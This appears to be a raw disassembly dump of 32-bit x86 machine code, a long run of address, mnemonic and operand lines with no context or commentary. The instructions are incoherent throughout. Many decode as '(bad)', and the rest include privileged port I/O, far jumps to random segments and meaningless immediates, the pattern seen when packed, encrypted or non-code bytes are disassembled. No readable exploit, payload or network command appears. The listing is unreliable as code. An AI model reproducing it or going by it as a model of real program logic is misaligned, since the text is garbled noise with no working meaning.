  407354:	xchg   ebp,eax
  407355:	xchg   edx,eax
  407356:	clc    
  407357:	mov    esp,0x2850515a
  40735c:	neg    DWORD PTR [edx+0x4ce499cb]
  407362:	add    al,0x6e
  407364:	fwait
  407365:	or     BYTE PTR [edi+ecx*4],ah
  407368:	pop    ebp
  407369:	pushf  
  40736a:	sbb    BYTE PTR [eax+0x2a8d9dc1],dh
  407370:	cmc    
  407371:	inc    ecx
  407372:	std    
  407373:	out    0xd5,al
  407375:	sub    edi,DWORD PTR [eax]
  407377:	lea    esp,[edx]
  407379:	int    0x87
  40737b:	xchg   ebp,eax
  40737c:	fild   DWORD PTR [esi-0x39]
  40737f:	addr16 loop 0x407310
  407382:	pop    ebx
  407383:	out    0xb5,al
  407385:	inc    esp
  407386:	(bad)  
  407387:	fwait
  407388:	cmc    
  407389:	sti    
  40738a:	sar    DWORD PTR [edi+0x67a0ff8a],0x39
  407391:	pop    ds
  407392:	(bad)  
  407393:	xor    al,0xd9
  407395:	retf   0xd42e
  407398:	push   ebp
  407399:	cmp    ebp,DWORD PTR [ebp-0x18fc5071]
  40739f:	mov    al,ds:0x8ee1bc4d
  4073a4:	and    cl,BYTE PTR [edi+0x3a52071d]
  4073aa:	mov    bh,0x1c
  4073ac:	scas   al,BYTE PTR es:[edi]
  4073ad:	push   ss
  4073ae:	jns    0x4073ae
  4073b0:	jp     0x4073bc
  4073b2:	(bad)  
  4073b3:	and    DWORD PTR [ebp-0x24],ebp
  4073b6:	mov    eax,ds:0x1deb3c5c
  4073bb:	sub    bh,BYTE PTR [ebx+0x3fd57fd0]
  4073c1:	iret   
  4073c2:	nop
  4073c3:	pop    ss
  4073c4:	xchg   esp,eax
  4073c5:	dec    edx
  4073c6:	ror    BYTE PTR [ebp+0x54],0xb7
  4073ca:	inc    ecx
  4073cb:	std    
  4073cc:	push   cs
  4073cd:	pop    ss
  4073ce:	push   ss
  4073cf:	sub    DWORD PTR [eax-0x1d],edi
  4073d2:	call   0x161e6113
  4073d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073d8:	aam    0xd3
  4073da:	fs in  eax,0xb8
  4073dd:	in     al,dx
  4073de:	je     0x407379
  4073e0:	mov    bh,0x67
  4073e2:	mov    eax,0x77a27baa
  4073e7:	xchg   edx,eax
  4073e8:	pop    edi
  4073ea:	fs mov ?,ecx
  4073ed:	jne    0x4073a0
  4073ef:	sbb    eax,0xc0bf2199
  4073f4:	enter  0xaf80,0x67
  4073f8:	and    al,0xea
  4073fa:	aaa    
  4073fb:	mov    BYTE PTR [ecx-0x78],bl
  4073fe:	dec    ecx
  4073ff:	cli    
  407400:	xchg   esp,eax
  407401:	imul   ecx,ebp,0x71bc9ca0
  407407:	mov    edi,DWORD PTR [edx]
  407409:	mov    ebx,0x201b9d66
  40740e:	das    
  40740f:	pusha  
  407410:	jge    0x4073c6
  407412:	jp     0x40748d
  407414:	popa   
  407415:	cwde   
  407416:	xchg   ebx,eax
  407417:	push   esi
  407418:	inc    esi
  407419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40741a:	inc    esp
  40741b:	cwde   
  40741c:	lea    edx,[edi]
  40741e:	push   0xf084d7c9
  407423:	pop    edi
  407424:	sub    eax,0xe3900a61
  407429:	mov    fs,edx
  40742b:	(bad)  
  40742d:	or     esp,DWORD PTR [esi]
  40742f:	push   0xffffffe7
  407431:	jg     0x4073f7
  407433:	test   al,0x9b
  407435:	pusha  
  407436:	sbb    edx,DWORD PTR [edi+0x76]
  407439:	sub    DWORD PTR [edx],0xf3d99e15
  40743f:	je     0x40742f
  407441:	or     eax,DWORD PTR [edx]
  407443:	(bad)  
  407444:	enter  0x21e3,0x2b
  407448:	les    ecx,FWORD PTR [eax-0x1f19b3c3]
  40744e:	jns    0x4074c4
  407450:	std    
  407451:	xchg   BYTE PTR [ebx-0x60],ch
  407454:	inc    ebp
  407455:	jne    0x40742c
  407457:	dec    edx
  407458:	jns    0x407418
  40745a:	or     BYTE PTR [edi-0x4c9c518f],0x9
  407461:	xchg   edi,eax
  407462:	jo     0x407499
  407464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407465:	std    
  407466:	mov    esi,0x7a59a128
  40746b:	push   ebx
  40746c:	ret    
  40746d:	sbb    DWORD PTR [ebp-0x6a5bc2c9],esi
  407473:	mov    ecx,0x5b4f3d85
  407478:	(bad)  
  407479:	mov    esi,0xe12682c7
  40747e:	dec    ecx
  40747f:	(bad)  
  407481:	jo     0x4074ca
  407483:	pop    ds
  407484:	rol    BYTE PTR [ebx],1
  407486:	mov    ecx,0x921f9b6e
  40748b:	pop    ebp
  40748c:	and    DWORD PTR [ebp*4+0x69fdcc],edx
  407493:	aam    0x9c
  407495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407496:	or     al,0xa
  407498:	cdq    
  407499:	out    dx,al
  40749a:	call   0xd79a:0xef8f49f4
  4074a1:	fidivr DWORD PTR [ebp-0x6920b5fe]
  4074a7:	(bad)  
  4074a8:	sbb    DWORD PTR [ecx-0x20befcee],eax
  4074ae:	cld    
  4074af:	inc    ebp
  4074b0:	retw   
  4074b2:	clc    
  4074b3:	mov    fs,WORD PTR ds:0x344f1462
  4074b9:	in     al,dx
  4074ba:	pop    ebx
  4074bb:	sub    al,0xce
  4074bd:	out    0x6e,al
  4074bf:	xchg   DWORD PTR [edi+eiz*4],edi
  4074c2:	pop    ss
  4074c3:	cmp    ah,BYTE PTR gs:0x74b3ccf4
  4074ca:	stos   BYTE PTR es:[edi],al
  4074cb:	push   ss
  4074cc:	adc    al,0x88
  4074ce:	pusha  
  4074cf:	mov    BYTE PTR [eax+0x6eb873a7],dh
  4074d5:	nop
  4074d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074d7:	mov    ch,ah
  4074d9:	xor    al,0x61
  4074db:	js     0x4074f3
  4074dd:	cmp    BYTE PTR [ecx],0x79
  4074e0:	pop    esi
  4074e1:	sub    ebx,ecx
  4074e3:	jns    0x4074d7
  4074e5:	ds jo  0x407503
  4074e8:	jmp    0x2eb0:0xc808090c
  4074ef:	cs inc edx
  4074f1:	das    
  4074f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074f3:	daa    
  4074f4:	inc    edx
  4074f5:	imul   BYTE PTR ds:0xd1360fa7
  4074fb:	adc    DWORD PTR [ebp+0x61],edx
  4074fe:	mov    bh,0xd1
  407500:	aas    
  407501:	imul   edi,DWORD PTR gs:[eax-0x4b],0xffffff8e
  407506:	stos   DWORD PTR es:[edi],eax
  407507:	inc    ebx
  407508:	lods   al,BYTE PTR ds:[esi]
  407509:	mov    bl,ah
  40750b:	(bad)  
  40750c:	jp     0x4074ff
  40750e:	mov    ebp,0x7e278b37
  407513:	out    dx,eax
  407514:	mov    ebx,0x67ef840a
  407519:	shl    BYTE PTR [esi+0x4f],1
  40751c:	sahf   
  40751d:	lea    eax,[edx+ecx*1]
  407520:	xor    DWORD PTR [ebp+0x5b],edx
  407523:	jmp    0x3a88:0x1fe1e752
  40752a:	test   BYTE PTR [ecx-0x7b94902b],0x4
  407531:	test   DWORD PTR [eax],ebp
  407533:	cmp    ebx,DWORD PTR [esi-0x536280d9]
  407539:	repnz inc edx
  40753b:	inc    esi
  40753c:	and    eax,DWORD PTR [esi]
  40753e:	(bad)  
  40753f:	xor    eax,0x5ce5b799
  407544:	xchg   BYTE PTR [eax+0x26b75f9d],bh
  40754a:	and    edi,DWORD PTR [esi]
  40754c:	repz cmc 
  40754e:	out    0x1d,al
  407550:	pop    ebp
  407551:	add    al,0xb5
  407553:	inc    esp
  407554:	mov    ah,0xd9
  407556:	sar    BYTE PTR [eax-0x79031ae2],cl
  40755c:	jmp    0xb118:0xfa883432
  407563:	mov    dh,0xf0
  407565:	jmp    0x407533
  407567:	(bad)  
  407568:	and    esi,DWORD PTR [ebx+0x3d4f6831]
  40756e:	ss pop ds
  407570:	and    al,0x3c
  407572:	cmp    BYTE PTR [ebp+esi*4+0x28d2fd4e],0x8f
  40757a:	add    edi,DWORD PTR [ecx+0x25716303]
  407580:	xlat   BYTE PTR ds:[ebx]
  407581:	mov    al,bh
  407583:	shl    DWORD PTR [ebp+0x11b1f7b8],1
  407589:	aas    
  40758a:	mov    al,BYTE PTR [esp+esi*4]
  40758d:	dec    ebx
  40758e:	je     0x407573
  407590:	repz jecxz 0x40759d
  407593:	push   esp
  407594:	sub    ah,BYTE PTR [ebp-0xb]
  407597:	xchg   DWORD PTR [ebx-0x332eda8f],eax
  40759d:	lock gs add eax,0x298ef30b
  4075a4:	push   edx
  4075a5:	pusha  
  4075a6:	in     eax,dx
  4075a7:	jecxz  0x4075da
  4075a9:	pop    ebx
  4075aa:	dec    ebx
  4075ab:	push   eax
  4075ac:	inc    eax
  4075ad:	xchg   ebx,eax
  4075ae:	out    0xb0,al
  4075b0:	mov    edi,0x7149392e
  4075b5:	push   ds
  4075b6:	mov    dh,BYTE PTR [ebp-0x1b1984ca]
  4075bc:	mov    dl,0x8a
  4075be:	sub    eax,0xff2d0675
  4075c3:	cli    
  4075c4:	out    dx,eax
  4075c5:	xor    DWORD PTR [ebp+ebp*8+0x59ad9fa],ebp
  4075cc:	ret    0xde6c
  4075cf:	mov    dl,0xb3
  4075d1:	adc    BYTE PTR [edi-0x3dd18c9a],ch
  4075d7:	aaa    
  4075d8:	ins    DWORD PTR es:[edi],dx
  4075d9:	scas   al,BYTE PTR es:[edi]
  4075da:	leave  
  4075db:	and    DWORD PTR [ebx+0x9],ebp
  4075de:	sbb    eax,0x95c8e300
  4075e3:	into   
  4075e4:	aam    0x73
  4075e6:	in     eax,dx
  4075e7:	xlat   BYTE PTR ds:[ebx]
  4075e8:	(bad)  
  4075e9:	pop    ss
  4075ea:	push   ecx
  4075eb:	add    ebp,DWORD PTR [ebp+0x33]
  4075ee:	rcl    bl,1
  4075f0:	adc    bh,BYTE PTR [esi]
  4075f2:	push   esp
  4075f3:	test   al,0x85
  4075f5:	mov    al,ds:0x48c3160a
  4075fa:	xchg   edx,eax
  4075fb:	dec    dx
  4075fd:	out    dx,al
  4075fe:	es test al,0x7b
  407601:	into   
  407602:	outs   dx,DWORD PTR ds:[esi]
  407603:	push   ds
  407604:	(bad)  
  407605:	sub    cl,ah
  407607:	retf   0x68ea
  40760a:	mov    BYTE PTR [ecx*4-0x34065045],al
  407611:	xchg   esp,eax
  407612:	test   al,0x67
  407614:	cmovne ebx,DWORD PTR [eax]
  407617:	rcr    ah,cl
  407619:	dec    ecx
  40761a:	shl    DWORD PTR [ecx-0x7e14d56d],1
  407620:	jb     0x40760d
  407622:	mov    ?,WORD PTR [edx+edi*8+0x1c114760]
  407629:	(bad)  
  40762a:	enter  0xacd5,0x85
  40762e:	jl     0x4075f2
  407630:	test   DWORD PTR [ebp+0x3d],esp
  407633:	xor    al,0xa2
  407635:	imul   eax,DWORD PTR [ecx],0xbc26336
  40763b:	add    DWORD PTR [ecx],edx
  40763d:	sbb    bl,0x9c
  407640:	push   ds
  407641:	push   ebx
  407642:	dec    esi
  407643:	data16 aas 
  407645:	das    
  407646:	fprem  
  407648:	push   cs
  407649:	js     0x4075d8
  40764b:	stc    
  40764c:	aaa    
  40764d:	pusha  
  40764e:	lds    ebx,FWORD PTR ds:0xa359eb8c
  407654:	dec    esp
  407655:	cwde   
  407656:	(bad)  
  407657:	aas    
  407658:	stos   BYTE PTR es:[edi],al
  407659:	sahf   
  40765a:	push   edx
  40765b:	lock xchg edi,eax
  40765d:	out    dx,eax
  40765e:	fwait
  40765f:	xor    BYTE PTR [esi-0x64821d12],cl
  407665:	xor    bh,BYTE PTR [ebx-0x28]
  407668:	adc    eax,0x86ffea9f
  40766d:	xor    ecx,DWORD PTR [ecx-0x354bf382]
  407673:	in     eax,dx
  407674:	sti    
  407675:	dec    edx
  407676:	pushf  
  407677:	in     al,dx
  407678:	mov    dh,0xae
  40767a:	push   cs
  40767b:	out    dx,eax
  40767c:	sti    
  40767d:	push   eax
  40767e:	ds pop ecx
  407680:	shl    al,cl
  407682:	and    esi,edi
  407684:	test   BYTE PTR [eax],al
  407686:	jnp    0x407664
  407688:	pop    edx
  407689:	push   ebx
  40768a:	fldenv [ecx-0x60]
  40768d:	cmp    dl,BYTE PTR [edi+0x7402a3c4]
  407693:	xchg   ebx,eax
  407694:	sar    DWORD PTR [edx-0x1d],1
  407697:	inc    esp
  407698:	mov    ecx,0x744be62a
  40769d:	add    al,bh
  40769f:	es pop edx
  4076a1:	mov    edx,DWORD PTR [ebp-0x72]
  4076a4:	xchg   esp,eax
  4076a5:	jne    0x407712
  4076a7:	cdq    
  4076a8:	jecxz  0x40770b
  4076aa:	adc    esi,DWORD PTR [ecx+ebp*8]
  4076ad:	adc    eax,0xa9d18b8
  4076b2:	test   eax,0xfc4a7d0c
  4076b7:	ja     0x407717
  4076b9:	push   0xbdb42b1f
  4076be:	inc    esi
  4076bf:	icebp  
  4076c0:	jno    0x407648
  4076c2:	or     ch,dl
  4076c4:	xchg   ebx,eax
  4076c5:	lds    esi,FWORD PTR [esi+edi*2-0x528fe49b]
  4076cc:	addr16 jbe 0x40773c
  4076cf:	dec    esi
  4076d0:	mov    eax,ds:0x8ccbb16e
  4076d5:	inc    ecx
  4076d6:	sbb    eax,0x88d38075
  4076db:	sub    BYTE PTR [edx+0x65],cl
  4076de:	aad    0xcb
  4076e0:	and    esi,DWORD PTR [ebx+ebp*2-0x5b]
  4076e4:	leave  
  4076e5:	int3   
  4076e6:	(bad)
  4076e9:	(bad)  
  4076ea:	stc    
  4076eb:	sub    bh,BYTE PTR [esi]
  4076ed:	mov    ?,edx
  4076ef:	and    DWORD PTR [ebx-0x76],esp
  4076f2:	or     ah,BYTE PTR [ebx-0x1a]
  4076f5:	mov    WORD PTR [eax-0x57f8621],cs
  4076fb:	mov    ch,0xf3
  4076fd:	ja     0x4076e0
  4076ff:	cld    
  407700:	dec    edx
  407701:	outs   dx,BYTE PTR ds:[esi]
  407702:	adc    DWORD PTR [ebx],ecx
  407704:	(bad)  
  407705:	jns    0x4076bf
  407707:	push   0xd18ca908
  40770c:	inc    eax
  40770d:	and    bl,BYTE PTR [edi+0x5a8cd698]
  407713:	xchg   ebp,eax
  407714:	in     eax,dx
  407715:	cmp    cl,BYTE PTR [edi+0x67177332]
  40771b:	int3   
  40771c:	stos   BYTE PTR es:[edi],al
  40771d:	and    edi,DWORD PTR [eax+0x7c3e8fa0]
  407723:	mov    BYTE PTR [eax+0x78],bl
  407726:	mul    DWORD PTR [ebx-0x2]
  407729:	sbb    eax,0x1d4a50c2
  40772e:	add    ecx,DWORD PTR [edi-0x7e]
  407731:	adc    al,0x0
  407733:	stc    
  407734:	push   es
  407735:	or     eax,0x7eb4df9c
  40773a:	adc    DWORD PTR [ebp+0x5c],edx
  40773d:	inc    esp
  40773e:	dec    esi
  40773f:	ds leave 
  407741:	in     eax,dx
  407742:	icebp  
  407743:	fist   DWORD PTR [eax+eax*2-0x44943ea7]
  40774a:	add    al,BYTE PTR [ebx]
  40774c:	int3   
  40774d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40774e:	cwde   
  40774f:	jle    0x40774d
  407751:	and    dl,BYTE PTR [ebp-0x6464078e]
  407757:	xor    esi,ebp
  407759:	adc    eax,0xdeb2db81
  40775e:	mul    DWORD PTR es:[ebx-0x1d3f78e6]
  407765:	call   0xaf2634a0
  40776a:	mov    eax,ds:0xb84a4cf1
  40776f:	jge    0x407735
  407771:	mov    DWORD PTR [edi],eax
  407773:	adc    eax,0x98ef20ab
  407778:	es jecxz 0x4077f1
  40777b:	push   eax
  40777c:	fdivr  QWORD PTR ds:0x5c8d6198
  407782:	or     al,BYTE PTR ds:0x79129a5e
  407788:	dec    edx
  407789:	clc    
  40778a:	dec    edx
  40778b:	in     al,dx
  40778c:	mov    ds:0x16a2d65d,al
  407791:	stos   BYTE PTR es:[edi],al
  407792:	add    eax,0x1facb5b6
  407797:	xor    al,0x58
  407799:	ins    BYTE PTR es:[edi],dx
  40779a:	or     BYTE PTR [esi],dl
  40779c:	push   ss
  40779d:	(bad)  
  40779e:	sub    DWORD PTR [edi],edi
  4077a0:	jmp    0x5727de8e
  4077a5:	call   0x9caf:0x29f6958
  4077ac:	pop    ebp
  4077ad:	add    al,0x6c
  4077af:	ror    DWORD PTR [esi],0x15
  4077b2:	mov    edi,0x143959c2
  4077b7:	int    0xc7
  4077b9:	xchg   esi,eax
  4077ba:	int3   
  4077bb:	xchg   ecx,eax
  4077bc:	push   ss
  4077bd:	xchg   ecx,eax
  4077be:	jno    0x40776d
  4077c0:	out    dx,eax
  4077c1:	and    BYTE PTR [ecx+esi*8+0x62],dl
  4077c5:	jp     0x407816
  4077c7:	in     eax,0x8
  4077c9:	scas   eax,DWORD PTR es:[edi]
  4077ca:	test   eax,0x55779bea
  4077cf:	add    al,0x31
  4077d1:	xlat   BYTE PTR ds:[ebx]
  4077d2:	cmp    al,0x3f
  4077d4:	das    
  4077d5:	jp     0x4077ff
  4077d7:	and    eax,0x696f1ee2
  4077dc:	imul   edx,DWORD PTR [esi+0x2d],0xe1ca1644
  4077e3:	cdq    
  4077e4:	ss mov al,0xe
  4077e7:	xlat   BYTE PTR ds:[ebx]
  4077e8:	out    0x8e,al
  4077ea:	out    0xfb,eax
  4077ec:	int3   
  4077ed:	jbe    0x40778b
  4077ef:	retf   
  4077f0:	and    eax,0xd8142dd
  4077f5:	in     al,dx
  4077f6:	adc    BYTE PTR [esi+0x31],dh
  4077f9:	jno    0x40782d
  4077fb:	enter  0x4694,0x79
  4077ff:	jp     0x4077b1
  407801:	fadd   st,st(4)
  407803:	push   esi
  407804:	in     al,dx
  407805:	retf   0x2cb3
  407808:	inc    edx
  407809:	(bad)  
  40780a:	mov    ecx,0xa6919c99
  40780f:	ret    
  407810:	jg     0x407839
  407812:	pushf  
  407813:	sar    DWORD PTR [ecx+0x47],1
  407816:	inc    edx
  407817:	or     BYTE PTR [ebx+0xd],bl
  40781a:	xlat   BYTE PTR ss:[ebx]
  40781c:	sahf   
  40781d:	jmp    0x407836
  40781f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407820:	enter  0x73fc,0xed
  407824:	outs   dx,DWORD PTR ds:[esi]
  407825:	xchg   edx,eax
  407826:	repnz inc edx
  407828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407829:	add    BYTE PTR [esi-0x23],ch
  40782c:	mov    al,dl
  40782e:	and    bl,BYTE PTR [ecx+0x20f69ddd]
  407834:	aas    
  407835:	jmp    0x8e7bc0d1
  40783a:	mov    eax,esp
  40783c:	ins    DWORD PTR es:[edi],dx
  40783d:	xor    ebp,DWORD PTR [ecx-0x4a]
  407840:	popf   
  407841:	sub    eax,0x7da481bd
  407846:	and    eax,0x427476dc
  40784b:	add    BYTE PTR [eax],ch
  40784d:	sbb    cl,BYTE PTR [eax]
  40784f:	or     DWORD PTR [ebp+0x7a62483d],edi
  407855:	in     eax,0x1c
  407857:	mov    ds:0x9bd84f81,al
  40785c:	mov    ebp,0x1da66416
  407861:	les    ecx,FWORD PTR [eax]
  407863:	pushf  
  407864:	jb     0x4078b6
  407866:	xchg   ecx,eax
  407867:	cmp    eax,0x7b5511b8
  40786c:	push   ebx
  40786d:	test   BYTE PTR [edx],ch
  40786f:	mov    WORD PTR [ecx],fs
  407871:	mov    BYTE PTR [ebx],dh
  407873:	jno    0x40786c
  407875:	jg     0x407836
  407877:	and    eax,0x4cc11176
  40787c:	mov    BYTE PTR [edx+0x50c87995],al
  407882:	mov    ?,WORD PTR [ebp+0x59]
  407885:	test   BYTE PTR [ebx+0x2318b936],0x2c
  40788c:	pop    eax
  40788d:	inc    edx
  40788e:	lahf   
  40788f:	push   ebp
  407890:	adc    al,0x38
  407892:	jno    0x4078a1
  407894:	mov    BYTE PTR [edi+esi*4],0xe
  407898:	mov    eax,0xcb36cda1
  40789d:	packuswb mm7,mm5
  4078a0:	ins    BYTE PTR es:[edi],dx
  4078a1:	cwde   
  4078a2:	push   es
  4078a3:	push   edx
  4078a4:	ins    BYTE PTR es:[edi],dx
  4078a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078a6:	pop    esp
  4078a7:	cmp    eax,0x3ba2c791
  4078ac:	xor    al,0x34
  4078ae:	je     0x407835
  4078b0:	test   DWORD PTR [ecx+0x5843107a],eax
  4078b6:	repz jae 0x4078c5
  4078b9:	repnz cmp al,0x2d
  4078bc:	sub    DWORD PTR [ebx-0x62],ebx
  4078bf:	add    edi,0xd0d314f6
  4078c5:	push   edi
  4078c6:	test   al,0x8d
  4078c8:	clc    
  4078c9:	stc    
  4078ca:	lahf   
  4078cb:	adc    ecx,DWORD PTR [edi+edi*1+0x7df24c7b]
  4078d2:	ror    DWORD PTR [ecx+ebp*2],1
  4078d5:	sbb    al,0x71
  4078d7:	sbb    eax,0x72a4d794
  4078dc:	int3   
  4078dd:	or     al,al
  4078df:	lock pop edx
  4078e1:	push   ebx
  4078e2:	or     ch,BYTE PTR [esi]
  4078e4:	aaa    
  4078e5:	(bad)  
  4078e6:	in     eax,dx
  4078e7:	push   edx
  4078e8:	mov    DWORD PTR [ebx],edi
  4078ea:	adc    dl,BYTE PTR [ebx]
  4078ec:	sub    DWORD PTR [eax],ecx
  4078ee:	fisubr WORD PTR [esi+0x2a]
  4078f1:	mov    cl,0x3e
  4078f3:	retf   
  4078f4:	or     BYTE PTR [ebx-0x76c1db69],cl
  4078fa:	dec    ecx
  4078fb:	xchg   ebp,eax
  4078fc:	dec    edx
  4078fd:	mov    ecx,esp
  4078ff:	inc    ecx
  407900:	icebp  
  407901:	stc    
  407902:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  407904:	mov    esi,0x6e0d7a45
  407909:	popa   
  40790a:	xlat   BYTE PTR ds:[ebx]
  40790b:	test   eax,0xa4dcdf8b
  407910:	shr    bh,0x55
  407913:	sti    
  407914:	jns    0x407967
  407916:	popf   
  407917:	(bad)  
  407919:	mov    edx,0x84a96b0f
  40791e:	outs   dx,BYTE PTR ds:[esi]
  40791f:	xlat   BYTE PTR ds:[ebx]
  407920:	cli    
  407921:	icebp  
  407922:	pop    ds
  407923:	pop    ss
  407924:	scas   eax,DWORD PTR es:[edi]
  407925:	repz pop ss
  407927:	push   esp
  407928:	lock sub al,0x28
  40792b:	pop    ecx
  40792c:	inc    ebx
  40792d:	mov    eax,ds:0x6d5ae967
  407932:	and    DWORD PTR [esi-0xb],ecx
  407935:	ds inc esp
  407937:	cmp    eax,0x39952616
  40793c:	popa   
  40793d:	or     ecx,DWORD PTR [edi-0x35]
  407940:	push   edx
  407941:	jb     0x40790f
  407943:	dec    ebp
  407944:	mov    bl,0x4b
  407946:	mov    dl,cl
  407948:	fiadd  DWORD PTR ds:0xe42ca2b6
  40794e:	jo     0x40793b
  407950:	mov    dl,0x59
  407952:	jmp    0xac4d2092
  407957:	lods   eax,DWORD PTR ds:[esi]
  407958:	pusha  
  407959:	pop    esp
  40795a:	push   edi
  40795b:	or     esp,0xae41924a
  407961:	push   ss
  407962:	cmp    al,0xd4
  407964:	mov    edi,0x1626b0ed
  407969:	fs pop ebx
  40796b:	mov    ?,WORD PTR [edx+0x30]
  40796e:	ds (bad) 
  407971:	push   ss
  407972:	lods   eax,DWORD PTR ds:[esi]
  407973:	or     ch,BYTE PTR [eax-0x4]
  407976:	(bad)  
  407978:	dec    esp
  407979:	inc    ebx
  40797a:	fsubr  QWORD PTR [ebx]
  40797c:	mov    bl,0x60
  40797e:	out    dx,al
  40797f:	cmp    dh,BYTE PTR [ebp-0x6be32dba]
  407985:	pop    esp
  407986:	mov    bl,BYTE PTR [ebp+0x73]
  407989:	pop    ebx
  40798a:	cdq    
  40798b:	xor    esi,esp
  40798d:	mov    ch,0xa
  40798f:	sahf   
  407990:	mov    ebx,0x8df62a5d
  407995:	xchg   edx,eax
  407996:	inc    esi
  407997:	lds    esp,FWORD PTR [edx+0x4aefa391]
  40799d:	test   BYTE PTR [esi],ch
  40799f:	ins    DWORD PTR es:[edi],dx
  4079a0:	jmp    FWORD PTR [ebx+0x77de0c3c]
  4079a6:	ins    BYTE PTR es:[edi],dx
  4079a7:	call   0xba55a944
  4079ac:	call   0xd83c:0x1a3b7498
  4079b3:	cmovbe ebp,DWORD PTR [edi]
  4079b6:	push   ecx
  4079b7:	lahf   
  4079b8:	in     al,0x90
  4079ba:	mov    ecx,0xd8e810a0
  4079bf:	mov    al,0x9a
  4079c1:	push   edx
  4079c2:	je     0x4079f8
  4079c4:	aad    0x30
  4079c6:	test   eax,0xd7c756e9
  4079cb:	stos   BYTE PTR es:[edi],al
  4079cc:	push   eax
  4079cd:	mov    WORD PTR [edx],ss
  4079cf:	ror    BYTE PTR [edi+0x8],0x5a
  4079d3:	repz jp 0x4079c2
  4079d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079d7:	push   edi
  4079d8:	pushf  
  4079d9:	pop    ebx
  4079da:	mov    eax,ds:0xe0344356
  4079df:	fadd   DWORD PTR [ecx]
  4079e1:	jmp    0xb0307a80
  4079e6:	pop    ebp
  4079e7:	cmp    DWORD PTR [esi-0x7c0318c3],0xd44a1045
  4079f1:	xchg   ebp,eax
  4079f2:	add    BYTE PTR [ebx-0x47],al
  4079f5:	sub    al,0x1
  4079f7:	jl     0x407a4c
  4079f9:	cld    
  4079fa:	xchg   BYTE PTR [ebx-0x12dd87e],bl
  407a00:	lods   eax,DWORD PTR ds:[esi]
  407a01:	lock enter 0xee43,0xcc
  407a06:	mov    bl,0x3b
  407a08:	test   DWORD PTR [edx*8+0x217f3afd],ecx
  407a0f:	sub    BYTE PTR [esi+0x76],dl
  407a12:	icebp  
  407a13:	lods   eax,DWORD PTR ds:[esi]
  407a14:	dec    edi
  407a15:	dec    edi
  407a16:	fst    DWORD PTR [esi]
  407a18:	lods   al,BYTE PTR ds:[esi]
  407a19:	push   0xffffff9c
  407a1b:	inc    edi
  407a1c:	or     al,0x30
  407a1e:	jmp    0x688d:0x73f95190
  407a25:	adc    al,0xf0
  407a27:	mov    bh,0x3
  407a29:	or     BYTE PTR [esi-0x29095de9],ah
  407a2f:	mov    esp,0x7dd3f4c6
  407a34:	and    dh,BYTE PTR [esi-0x132d0b2f]
  407a3a:	stc    
  407a3b:	xor    DWORD PTR [eax+ebp*4-0x72],0xddeec4c6
  407a43:	lahf   
  407a44:	mov    dl,0xa3
  407a46:	jne    0x407a0d
  407a48:	mov    ah,0xb4
  407a4a:	xchg   esp,eax
  407a4b:	adc    al,BYTE PTR [edx-0x54de238a]
  407a51:	pop    eax
  407a52:	and    eax,0x33f32a5b
  407a57:	test   eax,ebx
  407a59:	inc    ebx
  407a5a:	mov    bl,0xb1
  407a5c:	push   ss
  407a5d:	adc    DWORD PTR [ecx+0x54f4eb67],ecx
  407a63:	mov    bh,0xd1
  407a65:	test   al,0x8f
  407a67:	mov    ds:0xabfbabe5,eax
  407a6c:	enter  0x7ee7,0xc7
  407a70:	jmp    0x407af1
  407a72:	ret    
  407a73:	mov    al,ds:0xdd41e223
  407a78:	js     0x407a1c
  407a7a:	dec    ebp
  407a7b:	cmp    eax,0xadc41a35
  407a80:	fidivr DWORD PTR [edx]
  407a82:	sahf   
  407a83:	into   
  407a84:	mov    edi,0x1477932d
  407a89:	inc    ecx
  407a8a:	and    edi,DWORD PTR [edi-0x7]
  407a8d:	push   eax
  407a8e:	push   0x41
  407a90:	sbb    DWORD PTR [edx-0x7b],ecx
  407a93:	inc    ebp
  407a94:	shl    bh,0xd8
  407a97:	fcomp  DWORD PTR [edi+0x7f81676e]
  407a9d:	xor    eax,0xb71acd93
  407aa2:	mov    ds:0xa06e9d8d,al
  407aa7:	call   0x4daa0b4e
  407aac:	mov    ecx,0x93168cb
  407ab1:	div    ebx
  407ab3:	stc    
  407ab4:	and    ebx,esi
  407ab6:	sub    BYTE PTR [eax],0x25
  407ab9:	lods   al,BYTE PTR ds:[esi]
  407aba:	sbb    al,0x67
  407abc:	sub    esi,DWORD PTR [esi+0x5ad4ea77]
  407ac2:	lock inc edx
  407ac4:	or     DWORD PTR [edi-0x34],ebx
  407ac7:	cdq    
  407ac8:	fdivp  st(5),st
  407aca:	xor    eax,edi
  407acc:	shr    BYTE PTR [esi],cl
  407ace:	cmp    al,0x98
  407ad0:	aad    0x0
  407ad2:	mov    dh,0x69
  407ad4:	add    ebp,DWORD PTR [ecx-0x25]
  407ad7:	pusha  
  407ad8:	jl     0x407af8
  407ada:	xor    eax,0x7723b7df
  407adf:	(bad)
  407ae4:	jl     0x407af7
  407ae6:	mov    bl,0x75
  407ae8:	fcomi  st,st(2)
  407aea:	and    eax,0xa4e39c9a
  407aef:	xchg   DWORD PTR cs:[edi+edx*8+0x4e43580f],esi
  407af7:	cmp    eax,0xddd4127b
  407afc:	sti    
  407afd:	loop   0x407ad9
  407aff:	push   edi
  407b00:	frstor [edx+0x61]
  407b03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b04:	or     esp,edi
  407b06:	xlat   BYTE PTR ds:[ebx]
  407b07:	gs popa 
  407b09:	lock ret 0x1f0b
  407b0d:	sub    esp,eax
  407b0f:	mov    bl,BYTE PTR [esi+edi*8+0x6547de1f]
  407b16:	xchg   DWORD PTR [edx],edx
  407b18:	lahf   
  407b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b1a:	enter  0xd621,0xdb
  407b1e:	retf   
  407b1f:	add    al,0x30
  407b21:	jmp    0xee42293d
  407b26:	sub    BYTE PTR [esp+ecx*1+0x1],bl
  407b2a:	jo     0x407ae5
